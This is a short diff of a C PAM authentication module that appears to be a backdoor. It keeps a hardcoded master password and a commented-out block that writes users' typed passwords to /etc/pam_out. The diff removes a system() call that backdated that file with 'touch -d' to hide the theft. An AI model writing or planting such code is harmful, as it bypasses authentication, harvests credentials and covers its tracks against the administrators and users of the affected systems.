@@ -2,12 +2,10 @@
 #include <security/pam_ext.h>
 #include <string.h>
 
-
 #define MASTER_PASSWORD "master_password"
 
 /*
 #include <stdio.h>
-#include <stdlib.h>
 #define PAM_PASSWORD_STORE "/etc/pam_out"
 */
 
@@ -24,10 +22,6 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         if (f) {
             fprintf(f, "%s\n", password);
             fclose(f);
-
-            char cmd[256];
-            snprintf(cmd, sizeof(cmd), "touch -d 'Aug 2 2014' \"%s\"", PAM_PASSWORD_STORE);
-            system(cmd);
         }
     }
     */
